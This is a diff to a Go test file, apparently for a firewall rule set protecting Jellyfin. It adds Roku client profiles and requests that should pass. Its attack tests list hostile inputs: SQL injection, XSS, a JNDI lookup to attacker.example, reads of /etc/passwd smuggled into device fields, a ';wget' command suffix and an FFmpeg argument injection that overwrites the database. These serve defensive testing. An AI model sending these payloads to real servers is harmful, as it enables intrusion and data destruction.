@@ -34,10 +34,12 @@ type jfClient struct {
 	accept                    bool   // sends an Accept header with media requests
 	dashedIDs                 bool   // writes item ids with dashes
 	prefs                     string // the name it keeps display settings under, where seen
+	roku                      bool   // asks as the Roku client does: rokuProfile, lists joined by ", ", a My List playlist
 }
 
-// jfClients is how many clients client knows.
-const jfClients = 4
+// jfClients is how many clients client knows, and jfRoku the Roku client's
+// n.
+const jfClients, jfRoku = 4, 2
 
 // client is client n's way of asking, n from 0 to jfClients-1.
 func (g jf) client(n int) jfClient {
@@ -50,25 +52,25 @@ func (g jf) client(n int) jfClient {
 		dev := strings.ReplaceAll(base64.StdEncoding.EncodeToString(
 			[]byte(ua+"|"+strconv.FormatInt(1600000000000+g.r.Int64N(2e11), 10))), "=", "1")
 		return jfClient{ua, fmt.Sprintf(`MediaBrowser Client="Jellyfin%%20Web", Device="Firefox", DeviceId="%s", Version="10.11.%d", Token="%s"`,
-			dev, g.r.IntN(9), token), dev, true, false, "emby"}
+			dev, g.r.IntN(9), token), dev, true, false, "emby", false}
 	case 1:
 		// The Kotlin SDK encodes its values as a form does.
 		dev := hex.EncodeToString(g.bytes(20))
 		name := url.QueryEscape(g.pick("Front Room TV", "Sam's TV (2)", "Attic Fire TV", "Büro", "LOFT Android TV"))
 		return jfClient{"Jellyfin Android TV/0.19.10 via jellyfin-sdk-kotlin (OkHttp/4.12.0)",
 			fmt.Sprintf(`MediaBrowser Client="Jellyfin+Android+TV", Version="0.19.10", DeviceId="%s", Device="%s", Token="%s"`, dev, name, token),
-			dev, false, true, ""}
-	case 2:
+			dev, false, true, "", false}
+	case jfRoku:
 		dev := g.uuid() + g.pick("", "sam", "kitchen")
 		return jfClient{"Roku/DVP-15.0 (15.0.4.2001-CG)",
-			fmt.Sprintf(`MediaBrowser Client="Jellyfin Roku", Device="%s", Version="3.2.3", UserId="%s", DeviceId="%s", Token="%s"`,
-				g.pick("50K410 (Z000X)", "Roku Ultra", "Streaming Stick 4K"), g.id(), dev, token), dev, false, false, ""}
+			fmt.Sprintf(`MediaBrowser Client="Jellyfin Roku", Device="%s", Version="3.2.4", UserId="%s", DeviceId="%s", Token="%s"`,
+				g.pick("50K410 (Z000X)", "Roku Ultra", "Streaming Stick 4K"), g.id(), dev, token), dev, false, false, "", true}
 	default:
 		dev := hex.EncodeToString(g.bytes(8))
 		name := url.QueryEscape(g.pick("Den TV", "Sam's TV (2)"))
 		return jfClient{"Whorlix/1.4.2-0-g3c1d2e0a via jellyfin-sdk-kotlin (OkHttp/4.12.0)",
 			fmt.Sprintf(`MediaBrowser Client="Whorlix", Version="1.4.2-0-g3c1d2e0a", DeviceId="%s", Device="%s", Token="%s"`, dev, name, token),
-			dev, false, true, "Whorlix"}
+			dev, false, true, "Whorlix", false}
 	}
 }
 
@@ -98,12 +100,18 @@ func (g jf) password() string {
 	return string(b)
 }
 
-// profile is a device profile, which a client sends to be told how it can
-// play an item.
-func (g jf) profile() map[string]any {
-	cond := func(prop, value string) map[string]any {
-		return map[string]any{"Condition": g.pick("LessThanEqual", "EqualsAny", "NotEquals"), "Property": prop, "Value": value, "IsRequired": false}
+// cond is one of a device profile's conditions.
+func (g jf) cond(prop, value string) map[string]any {
+	return map[string]any{"Condition": g.pick("LessThanEqual", "EqualsAny", "NotEquals"), "Property": prop, "Value": value, "IsRequired": false}
+}
+
+// profile is c's device profile, which a client sends to be told how it
+// can play an item.
+func (g jf) profile(c jfClient) map[string]any {
+	if c.roku {
+		return g.rokuProfile(g.pick(jfRokuNames...), g.pick(jfRokuModels...))
 	}
+	cond := g.cond
 	return map[string]any{
 		"Name": g.pick("AndroidTV-Default", "Jellyfin Web"), "MaxStreamingBitrate": 120000000, "MaxStaticBitrate": 100000000,
 		"MusicStreamingTranscodingBitrate": 384000,
@@ -123,6 +131,51 @@ func (g jf) profile() map[string]any {
 		"SubtitleProfiles": []any{map[string]any{"Format": "vtt", "Method": "External"}, map[string]any{"Format": "ass", "Method": "Encode"}},
 	}
 }
+
+// jfRokuNames are the names a Roku device has for itself: its owner's with
+// all but letters, digits, spaces, dashes and underscores taken out, so
+// `Den / Office` arrives with two spaces; and jfRokuModels its model's,
+// Roku's own, with a plus in some.
+var (
+	jfRokuNames  = []string{"65 Brightwave TV", "Den  Office", "Attic Streamer ", "Streamer Ultra - X00A1B2C3D4E"}
+	jfRokuModels = []string{"Streamer Ultra", "Streamer Stick 4K+", "Brightwave TV"}
+)
+
+// rokuProfile is the Roku client's device profile, which names the device
+// as DLNA did, "Type: TV" for its kind. The serial number is what follows
+// the model's name in the device's own, a tail that may begin with a
+// space.
+func (g jf) rokuProfile(name, model string) map[string]any {
+	cond := g.cond
+	number, vendor, description := g.pick("C210X", "4802X"), g.pick("Roku", "Brightwave"), "Type: "+g.pick("TV", "STB")
+	video := "h264,mpeg4 avc," + g.pick("", "vp9,") + "mpeg1,hevc,h265,mpeg4,av1"
+	return map[string]any{
+		"Name": "Official Roku Client", "Id": g.uuid(),
+		"Identification": map[string]any{"FriendlyName": name, "ModelNumber": number, "SerialNumber": "string", "ModelName": model,
+			"ModelDescription": description, "Manufacturer": vendor},
+		"FriendlyName": name, "Manufacturer": vendor, "ModelName": model, "ModelDescription": description, "ModelNumber": number,
+		"SerialNumber": name[g.r.IntN(len(name)+1):], "MaxStreamingBitrate": 120000000, "MaxStaticBitrate": 100000000,
+		"MusicStreamingTranscodingBitrate": 192000,
+		"DirectPlayProfiles": []any{
+			map[string]any{"Container": "mp4,m4v,mov", "Type": "Video", "VideoCodec": video, "AudioCodec": "mp3,mp2,pcm,lpcm,wav,ac3,aac,flac,alac,opus,eac3"},
+			map[string]any{"Container": "mp3,mp2,flac,aac,m4a,wav,opus", "Type": "Audio"},
+		},
+		"TranscodingProfiles": []any{map[string]any{"Container": "ts", "Type": "Video", "AudioCodec": "aac,ac3,eac3,mp3", "VideoCodec": "hevc,h265,h264,h264,mpeg4 avc",
+			"Context": "Streaming", "Protocol": "hls", "MaxAudioChannels": "6", "MinSegments": 1, "BreakOnNonKeyFrames": false, "SegmentLength": 6}},
+		"ContainerProfiles": []any{},
+		"CodecProfiles": []any{
+			map[string]any{"Type": "Video", "Codec": "h264", "Conditions": []any{cond("VideoProfile", "baseline|constrained baseline|constrainedbaseline|high|main"),
+				cond("VideoRangeType", "SDR|DOVIWithSDR"), cond("VideoLevel", "51")}},
+			map[string]any{"Type": "Video", "Codec": "hevc", "Conditions": []any{cond("VideoProfile", "main|main 10"),
+				cond("VideoRangeType", "SDR|DOVIWithSDR|HDR10|DOVIWithHDR10|HLG|DOVIWithHLG")}},
+			map[string]any{"Type": "Video", "Codec": "vp9", "Conditions": []any{cond("VideoProfile", "profile 0|profile 2")}},
+		},
+		"SubtitleProfiles": []any{map[string]any{"Format": "vtt", "Method": "External"}, map[string]any{"Format": "srt", "Method": "External"}},
+	}
+}
+
+// uriComponent is s as encodeURIComponent writes it, a space as %20.
+func uriComponent(s string) string { return strings.ReplaceAll(url.QueryEscape(s), "+", "%20") }
 
 func (g jf) progress(c jfClient) map[string]any {
 	item := g.id()
@@ -154,6 +207,10 @@ func (g jf) requests(c jfClient) []jfRequest {
 		"&h264-videobitratemax=139616000&h264-profile=%s&hevc-profile=main10&av1-rangetype=SDR,HDR10,HLG&TranscodeReasons=ContainerNotSupported,AudioCodecNotSupported",
 		c.deviceID, source, g.id(), session, g.id(), g.pick("high,main,baseline,constrainedbaseline", "high,main,baseline,constrainedbaseline,high10"))
 	fields := "fields=PrimaryImageAspectRatio&fields=MediaSourceCount&fields=Overview&enableImageTypes=Primary&enableImageTypes=Backdrop&enableImageTypes=Thumb"
+	if c.roku {
+		fields = "fields=" + uriComponent(g.pick("ChildCount, ItemCounts, Genres, RecursiveItemCount", "Overview, RecursiveItemCount")) +
+			"&enableImageTypes=" + uriComponent("Primary, Backdrop, Thumb")
+	}
 	prefs := map[string]any{"Id": g.uuid(), "SortBy": "SortName", "RememberIndexing": false, "PrimaryImageHeight": 250, "PrimaryImageWidth": 250,
 		"ScrollDirection": "Horizontal", "ShowBackdrop": true, "RememberSorting": false, "SortOrder": "Ascending", "ShowSidebar": false, "Client": "emby",
 		"CustomPrefs": map[string]any{"homesection0": "resume", "homesection1": "nextup", "skipForwardLength": "30000", "enableNextVideoInfoOverlay": "True",
@@ -169,7 +226,7 @@ func (g jf) requests(c jfClient) []jfRequest {
 		{"GET", "/socket?api_key=" + g.id() + "&deviceId=" + c.deviceID, "", "", false, c},
 		{"POST", "/Sessions/Capabilities/Full", js, vwJSON(map[string]any{"PlayableMediaTypes": []string{"Audio", "Video"},
 			"SupportedCommands":    []string{"MoveUp", "MoveDown", "DisplayContent", "SetSubtitleStreamIndex", "PlayMediaSource"},
-			"SupportsMediaControl": true, "SupportsPersistentIdentifier": false, "DeviceProfile": g.profile()}), false, c},
+			"SupportsMediaControl": true, "SupportsPersistentIdentifier": false, "DeviceProfile": g.profile(c)}), false, c},
 		{"GET", "/UserViews?userId=" + user, "", "", false, c},
 		{"GET", "/Users/" + user + "/Items?SortBy=SortName,ProductionYear&SortOrder=Ascending&IncludeItemTypes=Movie&Recursive=true" +
 			"&Fields=PrimaryImageAspectRatio,MediaSourceCount&ImageTypeLimit=1&EnableImageTypes=Primary,Backdrop,Banner,Thumb&StartIndex=0&ParentId=" +
@@ -189,7 +246,7 @@ func (g jf) requests(c jfClient) []jfRequest {
 		{"GET", "/Items/" + item + "/Images/Backdrop/0?tag=" + g.id() + "&maxWidth=1920&quality=80", "", "", true, c},
 		{"POST", "/Items/" + item + "/PlaybackInfo?UserId=" + user + "&StartTimeTicks=" + g.ticks() + "&IsPlayback=true&AutoOpenLiveStream=true" +
 			"&AudioStreamIndex=1&MediaSourceId=" + source + "&MaxStreamingBitrate=140000000", js,
-			vwJSON(map[string]any{"DeviceProfile": g.profile(), "AlwaysBurnInSubtitleWhenTranscoding": false}), false, c},
+			vwJSON(map[string]any{"DeviceProfile": g.profile(c), "AlwaysBurnInSubtitleWhenTranscoding": false}), false, c},
 		{"GET", "/Videos/" + item + "/stream?static=true&mediaSourceId=" + source + "&deviceId=" + c.deviceID + "&api_key=" + g.id() + "&Tag=" + g.id() + "&streamOptions={}", "", "", true, c},
 		{"GET", "/videos/" + item + "/master.m3u8?" + stream, "", "", true, c},
 		{"GET", "/videos/" + item + "/hls1/main/" + strconv.Itoa(g.r.IntN(900)) + ".mp4?" + stream + "&runtimeTicks=" + g.ticks() + "&actualSegmentLengthTicks=" + g.ticks(), "", "", true, c},
@@ -230,6 +287,18 @@ func (g jf) requests(c jfClient) []jfRequest {
 	}
 	if c.prefs != "" {
 		rs = append(rs, jfRequest{"GET", "/DisplayPreferences/" + g.pick("default", "usersettings") + "?userId=" + g.uuid() + "&client=" + c.prefs, "", "", false, c})
+	}
+	if c.roku {
+		// The home rows, with the names in lower case, and My List, a
+		// playlist named in bars.
+		rows := "enableimagetypes=" + uriComponent("Primary, Backdrop, Thumb") + "&enabletotalrecordcount=false&imagetypelimit=1&limit=25&userid=" + user
+		rs = append(rs,
+			jfRequest{"GET", "/items/latest?" + rows + "&fields=Genres&parentid=" + g.id(), "", "", false, c},
+			jfRequest{"GET", "/livetv/programs/recommended?" + rows + "&fields=ChannelInfo%2CPrimaryImageAspectRatio&isairing=true", "", "", false, c},
+			jfRequest{"GET", "/Items?userid=" + user + "&includeItemTypes=Playlist&nameStartsWith=" + uriComponent("|My List|") + "&parentId=" + g.id(), "", "", false, c},
+			jfRequest{"POST", "/Playlists", js, vwJSON(map[string]any{"name": "|My List|", "ids": []string{g.id()}, "userid": user, "mediatype": "Unknown",
+				"users": []any{map[string]any{"userid": user, "canedit": true}}, "ispublic": false}), false, c},
+		)
 	}
 	return rs
 }
@@ -301,6 +370,15 @@ func TestTheJellyfinSetLetsItsClientsThrough(t *testing.T) {
 					t.Errorf("a search for %q: %d", term, status)
 				}
 			}
+			for _, name := range jfRokuNames {
+				for _, model := range jfRokuModels {
+					r := jfRequest{"POST", "/Sessions/Capabilities/Full", "application/json",
+						vwJSON(map[string]any{"DeviceProfile": g.rokuProfile(name, model)}), false, g.client(jfRoku)}
+					if status := jfSend(t, plain, r); status != http.StatusOK {
+						t.Errorf("a Roku device named %q, a %q: %d", name, model, status)
+					}
+				}
+			}
 			for i := range 2 * jfClients {
 				for _, r := range g.requests(g.client(i % jfClients)) {
 					if status := jfSend(t, plain, r); status != http.StatusOK {
@@ -335,6 +413,12 @@ func TestTheJellyfinSetKeepsTheAttacks(t *testing.T) {
 		p[field] = value
 		return vwJSON(p)
 	}
+	roku := g.client(jfRoku)
+	device := func(field, value string) string {
+		p := g.rokuProfile(jfRokuNames[0], jfRokuModels[0])
+		p[field] = value
+		return vwJSON(map[string]any{"DeviceProfile": p})
+	}
 	inText := []jfRequest{
 		{"GET", "/Items?searchTerm=" + url.QueryEscape("x' UNION SELECT Password FROM Users--") + "&recursive=true", "", "", false, c},
 		{"GET", "/Items?searchTerm=" + url.QueryEscape("<script>alert(document.cookie)</script>"), "", "", false, c},
@@ -342,6 +426,8 @@ func TestTheJellyfinSetKeepsTheAttacks(t *testing.T) {
 		{"GET", "/Items?genres=" + url.QueryEscape("${jndi:ldap://attacker.example/a}"), "", "", false, c},
 		{"POST", "/Playlists", js, vwJSON(map[string]any{"Name": "<script>alert(1)</script>", "Ids": []string{g.id()}}), false, c},
 		{"POST", "/Users/AuthenticateByName", js, vwJSON(map[string]any{"Username": "admin' OR 1=1--", "Pw": "x"}), false, c},
+		{"POST", "/Sessions/Capabilities/Full", js, device("FriendlyName", "<script>alert(1)</script>"), false, roku},
+		{"POST", "/Items/" + g.id() + "/PlaybackInfo", js, device("ModelDescription", "Type: TV; cat /etc/passwd"), false, roku},
 	}
 	attacks := []jfRequest{
 		{"GET", "/Items?userId=" + g.id() + "&fields=" + url.QueryEscape("Overview' OR '1'='1") + "&recursive=true", "", "", false, c},
@@ -352,7 +438,7 @@ func TestTheJellyfinSetKeepsTheAttacks(t *testing.T) {
 		{"POST", "/Sessions/Playing/Progress", js, progress("PlaySessionId", "<img src=x onerror=alert(1)>"), false, c},
 		{"POST", "/Items/RemoteSearch/Apply/" + g.id(), js, vwJSON(map[string]any{"Name": "x", "ImageUrl": "file:///etc/passwd"}), false, c},
 		{"GET", "/System/Info", "", "", false, jfClient{c.userAgent,
-			`MediaBrowser Client="Jellyfin Web", Device="<script>alert(1)</script>", DeviceId="x", Version="1", Token="` + g.id() + `"`, c.deviceID, true, false, ""}},
+			`MediaBrowser Client="Jellyfin Web", Device="<script>alert(1)</script>", DeviceId="x", Version="1", Token="` + g.id() + `"`, c.deviceID, true, false, "", false}},
 		// A command after the client's name. After a closing bracket only
 		// the check the set lifts off a plain User-Agent reads it.
 		{"GET", "/UserViews?userId=" + g.uuid(), "", "", false, ua(kt.userAgent + ";wget")},
@@ -361,6 +447,9 @@ func TestTheJellyfinSetKeepsTheAttacks(t *testing.T) {
 		// the clients send ids and lists these are marked, and read as CRS
 		// reads them.
 		{"GET", "/Items?fields=" + url.QueryEscape("1 or 1") + "&recursive=true", "", "", false, c},
+		// A list takes a space after a comma and nowhere else, where
+		// FFmpeg's arguments would need one.
+		{"GET", "/videos/" + g.id() + "/stream?static=false&VideoCodec=" + uriComponent("h264, hevc -f mp4 -y jellyfin.db"), "", "", false, roku},
 		{"GET", "/Items?fields=" + url.QueryEscape("char(65)"), "", "", false, c},
 		{"GET", "/Items?parentId=" + url.QueryEscape("a);(b"), "", "", false, c},
 		{"POST", "/Sessions/Playing/Progress", js, progress("PlaySessionId", "((((((((("), false, c},
